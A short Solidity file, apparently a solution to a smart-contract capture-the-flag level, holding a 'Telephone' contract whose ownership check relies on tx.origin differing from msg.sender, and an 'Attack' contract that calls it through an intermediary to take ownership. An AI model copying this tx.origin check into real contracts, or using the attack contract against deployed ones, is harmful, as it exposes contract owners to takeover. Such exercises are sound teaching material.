// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface i_Telephone {
    function changeOwner(address _owner) external;
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attack {
    function attack(address target) public {
        i_Telephone(target).changeOwner(tx.origin);
    }

}